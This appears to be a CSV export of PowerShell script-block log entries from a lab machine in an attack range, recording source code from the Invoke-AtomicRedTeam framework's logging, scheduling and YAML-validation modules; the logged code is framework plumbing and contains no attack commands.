        'attire-version' = '1.1'
        'execution-data' = ''
        procedures       = @()
    }
}

function Resolve-NonexistantPath($File) {
    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error

    if (-not($Path)) {
        $Path = $error[0].TargetObject
    }

    return $Path
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710579","1",", Get","Get [Score: 1]","195","function Get-PrereqExecutor ($test) {
    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }
    else { $executor = $test.dependency_executor_name }
    $executor
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711038","1",", Get","Get [Score: 1]","1359","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    if (!(Test-Path $logPath)) {
        New-Item $logPath -Force -ItemType File | Out-Null
    }
    $ipAddress = Get-PreferredIPAddress $isWindows
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710854","1",", Get","Get [Score: 1]","6031","# Attire-ExecutionLogger.psm1
# Copyright 2023 Security Risk Advisors

# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software),
# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

$script:attireLog = [PSCustomObject]@{
    'attire-version' = '1.1'
    'execution-data' = ''
    'procedures'     = @()
}

function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

    $ipAddress = Get-PreferredIPAddress $isWindows

    if ($targetUser -isnot [string]) {
        if ([bool]($targetUser.PSobject.Properties.name -match ""^value$"")) {
            $targetUser = $targetUser.value
        }
        else {
            $targetUser = $targetUser.ToString()
        }
    }
    if ($targetHostname -isnot [string]) {
        if ([bool]($targetHostname.PSobject.Properties.name -match ""^value$"")) {
            $targetHostname = $targetHostname.value
        }
        else {
            $targetHostname = $targetHostname.ToString()
        }
    }

    $target = [PSCustomObject]@{
        user = $targetUser
        host = $targetHostname
        ip   = $ipAddress
        path = $Env:PATH
    }

    $guid = New-Guid
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)
    $executionId = [Convert]::ToBase64String($bytes)

    $executionCategory = [PSCustomObject]@{
        'name'         = ""Atomic Red Team""
        'abbreviation' = ""ART""
    }

    $executionData = [PSCustomObject]@{
        'execution-source'   = ""Invoke-Atomicredteam""
        'execution-id'       = $executionId
        'execution-category' = $executionCategory
        'execution-command'  = $commandLine
        target               = $target
        'time-generated'     = """"
    }

    $script:attireLog.'execution-data' = $executionData
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {

    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()
    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()

    $procedureId = [PSCustomObject]@{
        type = ""guid""
        id   = $testGuid
    }

    $step = [PSCustomObject]@{
        'order'      = 1
        'time-start' = $startTime
        'time-stop'  = $stopTime
        'executor'   = $testExecutor
        'command'    = $command
        'process-id' = $res.ProcessId
        'exit-code'  = $res.ExitCode
        'is-timeout' = $res.IsTimeout
        'output'     = @()
    }

    $stdOutContents = $res.StandardOutput
    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {
        $stdOutContents = $stdOutContents.ToString()
    }

    $outputStdConsole = [PSCustomObject]@{
        content = $stdOutContents
        level   = ""STDOUT""
        type    = ""console""
    }

    $stdErrContents = $res.ErrorOutput
    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {
        $stdErrContents = $stdErrContents.ToString()
    }

    $outputErrConsole = [PSCustomObject]@{
        content = $stdErrContents
        level   = ""STDERR""
        type    = ""console""
    }

    [bool] $foundOutput = $false
    if ($res.StandardOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputStdConsole
    }

    if ($res.ErrorOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputErrConsole
    }

    if (!$foundOutput) {
        $emptyOutput = [PSCustomObject]@{
            content = """"
            level   = ""STDOUT""
            type    = ""console""
        }
        $step.output += $emptyOutput
    }

    $procedure = [PSCustomObject]@{
        'mitre-technique-id'    = $technique
        'procedure-name'        = $testName
        'procedure-id'          = $procedureId
        'procedure-description' = $testDescription
        order                   = $testNum
        steps                   = @()
    }

    $procedure.steps += $step

    $script:attireLog.procedures += $procedure
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {
    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')
    #$script:attireLog | Export-Csv -Path ""attireLogObject.csv""
    $content = ($script:attireLog | ConvertTo-Json -Depth 12)
    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False
    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)
    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII
    $script:attireLog = [PSCustomObject]@{
        'attire-version' = '1.1'
        'execution-data' = ''
        procedures       = @()
    }
}

function Resolve-NonexistantPath($File) {
    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error

    if (-not($Path)) {
        $Path = $error[0].TargetObject
    }

    return $Path
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710594","1",", Get","Get [Score: 1]","1945","function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {
    $defaultArgs = @{ }
    foreach ($key in $ip.Keys) {
        $defaultArgs[$key] = $ip[$key].default
    }
    # overwrite defaults with any user supplied values
    foreach ($key in $customInputArgs.Keys) {
        if ($defaultArgs.Keys -contains $key) {
            # replace default with user supplied
            $defaultArgs.set_Item($key, $customInputArgs[$key])
        }
        else {
            Write-Verbose ""The specified input argument *$key* was ignored as not applicable""
        }
    }
    $defaultArgs
}

function Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {
    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {
        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'
        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder

        foreach ($key in $inputArgs.Keys) {
            $findValue = '#{' + $key + '}'
            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])
        }
    }

    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value
    $finalCommand = ($finalCommand -replace ""\`$PathToAtomicsFolder"", $PathToAtomicsFolder) -replace ""PathToAtomicsFolder"", $PathToAtomicsFolder

    $finalCommand
}

function Invoke-PromptForInputArgs([hashtable]$ip) {
    $InputArgs = @{ }
    foreach ($key in $ip.Keys) {
        $InputArgs[$key] = $ip[$key].default
        $newValue = Read-Host -Prompt ""Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]""
        # replace default with user supplied
        if (-not [string]::IsNullOrWhiteSpace($newValue)) {
            $InputArgs.set_Item($key, $newValue)
        }
    }
    $InputArgs
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710660","1",", Get","Get [Score: 1]","1359","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    if (!(Test-Path $logPath)) {
        New-Item $logPath -Force -ItemType File | Out-Null
    }
    $ipAddress = Get-PreferredIPAddress $isWindows
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710548","1",", Get","Get [Score: 1]","7135","# Loop through all atomic yaml files to load into list of objects
function Loop($fileList, $atomicType) {
    $AllAtomicTests = New-Object System.Collections.ArrayList

    $fileList | ForEach-Object {
        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)
        if ( $currentTechnique -ne ""index"" ) {
            $technique = Get-AtomicTechnique -Path $_.FullName
            if ($technique) {
                $technique.atomic_tests | ForEach-Object -Process {
                    $test = New-Object -TypeName psobject
                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null
                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name
                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid
                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120
                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value """"
                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType
                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false
                    $test | Add-Member -MemberType NoteProperty -Name notes -Value """"

                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen
                    $dummy = $AllAtomicTests.Add(($test))
                }
            }
        }
    }
    return $AllAtomicTests

}

function Get-NewSchedule() {
    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {
        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File
        $publicAtomics = Loop $publicAtomicFiles ""Public""
    }
    else {
        Write-Host -ForegroundColor Yellow ""Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)""
    }
    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {
        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File
        $privateAtomics = Loop $privateAtomicFiles ""Private""
    }
    else {
        Write-Verbose ""Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)""
    }
    $AllAtomicTests = New-Object System.Collections.ArrayList
    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}
    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}
    return $AllAtomicTests
}

function Get-ScheduleRefresh() {
    $AllAtomicTests = Get-NewSchedule
    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)

    # Creating new schedule object for updating changes in atomics
    $newSchedule = New-Object System.Collections.ArrayList

    # Check if any tests haven't been added to schedule and add them
    $update = $false
    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {
        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }
        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }

        if (!$old) {
            $update = $true
            $newSchedule += $fresh
        }

        # Updating schedule with changes
        else {
            if ($fresh -is [array]) {
                $fresh = $fresh[0]
                LogRunnerMsg ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""
                Write-Host -ForegroundColor Yellow ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""; Start-Sleep 10
                exit
            }
            $old.Technique = $fresh.Technique
            $old.TestName = $fresh.TestName
            $old.supported_platforms = $fresh.supported_platforms

            $update = $true
            $newSchedule += $old
        }

    }
    if ($update) {
        $newSchedule | Export-Csv $artConfig.scheduleFile
        LogRunnerMsg ""Schedule has been updated with new tests.""
    }
    return $newSchedule

}

function Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {
    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {
        if ($listOfAtomics) {
            $schedule = Import-Csv $listOfAtomics
        }
        else {
            $schedule = Import-Csv $artConfig.scheduleFile
        }

        # Filter schedule to either Active/Supported Platform or TestGuids List
        if ($TestGuids) {
            $schedule = $schedule | Where-Object {
                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)
            }
        }
        else {
            if ($filterByEnabled -and $filterByPlatform) {
                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" )) }
            }
            elseif ($filterByEnabled) {
                $schedule = $schedule | Where-Object { $_.enabled -eq $true }
            }
            elseif ($filterByPlatform) {
                $schedule = $schedule | Where-Object { $_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" }
            }
        }

    }
    else {
        Write-Host -ForegroundColor Yellow ""Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'""
    }

    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow ""No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)""; return $null }
    return $schedule
}

function Invoke-GenerateNewSchedule() {
    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null

    LogRunnerMsg ""Generating new schedule: $($artConfig.scheduleFile)""
    $schedule = Get-NewSchedule
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Schedule written to $($artConfig.scheduleFile)""
}

function Invoke-RefreshExistingSchedule() {
    LogRunnerMsg ""Refreshing existing schedule: $($artConfig.scheduleFile)""
    $schedule = Get-ScheduleRefresh
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Refreshed schedule written to $($artConfig.scheduleFile)""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711058","1",", Get","Get [Score: 1]","2150","that all executor input arg names are defined input arg names.
            if ($InputArgumentNamesFromExecutor.Count) {
                $InputArgumentNamesFromExecutor | ForEach-Object {
                    if ($InputArgumentNames -notcontains $_) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'""
                        return
                    }
                }
            }

            # Validate that all defined input args are utilized at least once in the executor.
            if ($InputArgumentNames.Count) {
                $InputArgumentNames | ForEach-Object {
                    if ($InputArgumentNamesFromExecutor -notcontains $_) {
                        # Write a warning since this scenario is not considered a breaking change
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.""
                    }
                }
            }

            $ExecutorInstance.name = $AtomicTest['executor']['name']

            $AtomicTestInstance.executor = $ExecutorInstance

            $AtomicTests[$i] = $AtomicTestInstance
        }

        $AtomicInstance.atomic_tests = $AtomicTests

        $AtomicInstance
    }
}


# Tab completion for Atomic Tests
function Get-TechniqueNumbers {
    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }
    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |
    ForEach-Object { $_.BaseName }

    return $techniqueNumbers
}

Register-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)

    Get-TechniqueNumbers | Where-Object { $_ -like ""$wordToComplete*"" } |
    ForEach-Object {
        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', ""Technique number $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","3","3",""
"12/16/2024 8:34:57 PM","35711066","1",", Get","Get [Score: 1]","7135","# Loop through all atomic yaml files to load into list of objects
function Loop($fileList, $atomicType) {
    $AllAtomicTests = New-Object System.Collections.ArrayList

    $fileList | ForEach-Object {
        $currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName)
        if ( $currentTechnique -ne ""index"" ) {
            $technique = Get-AtomicTechnique -Path $_.FullName
            if ($technique) {
                $technique.atomic_tests | ForEach-Object -Process {
                    $test = New-Object -TypeName psobject
                    $test | Add-Member -MemberType NoteProperty -Name Order -Value $null
                    $test | Add-Member -MemberType NoteProperty -Name Technique -Value ($technique.attack_technique -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TestName -Value $_.name
                    $test | Add-Member -MemberType NoteProperty -Name auto_generated_guid -Value $_.auto_generated_guid
                    $test | Add-Member -MemberType NoteProperty -Name supported_platforms -Value ($_.supported_platforms -join ""|"")
                    $test | Add-Member -MemberType NoteProperty -Name TimeoutSeconds -Value 120
                    $test | Add-Member -MemberType NoteProperty -Name InputArgs -Value """"
                    $test | Add-Member -MemberType NoteProperty -Name AtomicsFolder -Value $atomicType
                    $test | Add-Member -MemberType NoteProperty -Name enabled -Value $false
                    $test | Add-Member -MemberType NoteProperty -Name notes -Value """"

                    # Added dummy variable to grab the index values returned by appending to an arraylist so they don't get written to the screen
                    $dummy = $AllAtomicTests.Add(($test))
                }
            }
        }
    }
    return $AllAtomicTests

}

function Get-NewSchedule() {
    if (Test-Path $artConfig.PathToPublicAtomicsFolder) {
        $publicAtomicFiles = Get-ChildItem $artConfig.PathToPublicAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml -File
        $publicAtomics = Loop $publicAtomicFiles ""Public""
    }
    else {
        Write-Host -ForegroundColor Yellow ""Public Atomics Folder not Found $($artConfig.PathToPublicAtomicsFolder)""
    }
    if (Test-Path $artConfig.PathToPrivateAtomicsFolder) {
        $privateAtomicFiles = Get-ChildItem $artConfig.PathToPrivateAtomicsFolder -Recurse -Exclude Indexes -Filter T*.yaml  -File
        $privateAtomics = Loop $privateAtomicFiles ""Private""
    }
    else {
        Write-Verbose ""Private Atomics Folder not Found $($artConfig.PathToPrivateAtomicsFolder)""
    }
    $AllAtomicTests = New-Object System.Collections.ArrayList
    try { $AllAtomicTests.AddRange($publicAtomics) }catch {}
    try { $AllAtomicTests.AddRange($privateAtomics) }catch {}
    return $AllAtomicTests
}

function Get-ScheduleRefresh() {
    $AllAtomicTests = Get-NewSchedule
    $schedule = Get-Schedule $null $false # get schedule, including inactive (ie not filtered)

    # Creating new schedule object for updating changes in atomics
    $newSchedule = New-Object System.Collections.ArrayList

    # Check if any tests haven't been added to schedule and add them
    $update = $false
    foreach ($guid in $AllAtomicTests | Select-Object -ExpandProperty auto_generated_guid) {
        $fresh = $AllAtomicTests | Where-Object { $_.auto_generated_guid -eq $guid }
        $old = $schedule | Where-Object { $_.auto_generated_guid -eq $guid }

        if (!$old) {
            $update = $true
            $newSchedule += $fresh
        }

        # Updating schedule with changes
        else {
            if ($fresh -is [array]) {
                $fresh = $fresh[0]
                LogRunnerMsg ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""
                Write-Host -ForegroundColor Yellow ""Duplicated auto_generated_guid found $($fresh.auto_generated_guid) with technique $($fresh.Technique).
                            `nCannot Continue Execution. System Exit""; Start-Sleep 10
                exit
            }
            $old.Technique = $fresh.Technique
            $old.TestName = $fresh.TestName
            $old.supported_platforms = $fresh.supported_platforms

            $update = $true
            $newSchedule += $old
        }

    }
    if ($update) {
        $newSchedule | Export-Csv $artConfig.scheduleFile
        LogRunnerMsg ""Schedule has been updated with new tests.""
    }
    return $newSchedule

}

function Get-Schedule($listOfAtomics, $filterByEnabled = $true, $testGuids = $null, $filterByPlatform = $true) {
    if ($listOfAtomics -or (Test-Path($artConfig.scheduleFile))) {
        if ($listOfAtomics) {
            $schedule = Import-Csv $listOfAtomics
        }
        else {
            $schedule = Import-Csv $artConfig.scheduleFile
        }

        # Filter schedule to either Active/Supported Platform or TestGuids List
        if ($TestGuids) {
            $schedule = $schedule | Where-Object {
                ($Null -ne $TestGuids -and $TestGuids -contains $_.auto_generated_guid)
            }
        }
        else {
            if ($filterByEnabled -and $filterByPlatform) {
                $schedule = $schedule | Where-Object { ($_.enabled -eq $true -and ($_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" )) }
            }
            elseif ($filterByEnabled) {
                $schedule = $schedule | Where-Object { $_.enabled -eq $true }
            }
            elseif ($filterByPlatform) {
                $schedule = $schedule | Where-Object { $_.supported_platforms -like ""*"" + $artConfig.OS + ""*"" }
            }
        }

    }
    else {
        Write-Host -ForegroundColor Yellow ""Couldn't find schedule file ($($artConfig.scheduleFile)) Update the path to the schedule file in the config or generate a new one with 'Invoke-GenerateNewSchedule'""
    }

    if (($null -eq $schedule) -or ($schedule.length -eq 0)) { Write-Host -ForegroundColor Yellow ""No active tests were found. Edit the 'enabled' column of your schedule file and set some to enabled (True)""; return $null }
    return $schedule
}

function Invoke-GenerateNewSchedule() {
    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore | Out-Null
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore | Out-Null

    LogRunnerMsg ""Generating new schedule: $($artConfig.scheduleFile)""
    $schedule = Get-NewSchedule
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Schedule written to $($artConfig.scheduleFile)""
}

function Invoke-RefreshExistingSchedule() {
    LogRunnerMsg ""Refreshing existing schedule: $($artConfig.scheduleFile)""
    $schedule = Get-ScheduleRefresh
    $schedule | Export-Csv $artConfig.scheduleFile -NoTypeInformation
    Write-Host -ForegroundColor Green ""Refreshed schedule written to $($artConfig.scheduleFile)""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710540","1",", Get","Get [Score: 1]","8641","type']) {
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')""
                    }

                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.""
                        return
                    }

                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']

                    $InputArguments[$InputArgName] = $InputArgument

                    $j++
                }
            }

            $AtomicTestInstance.input_arguments = $InputArguments

            if (-not $AtomicTest.ContainsKey('executor')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.""
                return
            }

            if (-not ($AtomicTest['executor'] -is [Hashtable])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.""
                return
            }

            if (-not $AtomicTest['executor'].ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.""
                return
            }

            if (-not ($AtomicTest['executor']['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.""
                return
            }

            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.""
                return
            }

            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')""
                return
            }

            if ($AtomicTest['executor']['name'] -eq 'manual') {
                if (-not $AtomicTest['executor'].ContainsKey('steps')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.""
                    return
                }

                if (-not ($AtomicTest['executor']['steps'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorManual]::new()
                $ExecutorInstance.steps = $AtomicTest['executor']['steps']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])
            }
            else {
                if (-not $AtomicTest['executor'].ContainsKey('command')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.""
                    return
                }

                if (-not ($AtomicTest['executor']['command'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorDefault]::new()
                $ExecutorInstance.command = $AtomicTest['executor']['command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])
            }

            # cleanup_command element is optional
            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {
                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])
            }

            # elevation_required element is optional
            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {
                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.""
                    return
                }

                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']
            }
            else {
                # if elevation_required is not present, default to false
                $ExecutorInstance.elevation_required = $False
            }

            $InputArgumentNames = $null

            # Get all input argument names
            $InputArgumentNames = $InputArguments.Keys

            # Extract all input arguments names from the executor
            # Potential places where input arguments can be populated:
            #  - Dependency description
            #  - Dependency prereq_command
            #  - Dependency get_prereq_command
            #  - Executor steps
            #  - Executor command
            #  - Executor cleanup_command

            $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
            ForEach-Object { $Regex.Matches($_) } |
            Select-Object -ExpandProperty Groups |
            Where-Object { $_.Name -eq 'ArgName' } |
            Select-Object -ExpandProperty Value |
            Sort-Object -Unique


            # Validate that all executor input arg names are defined input arg names.
            if ($InputArgumentNamesFromExecutor.Count) {
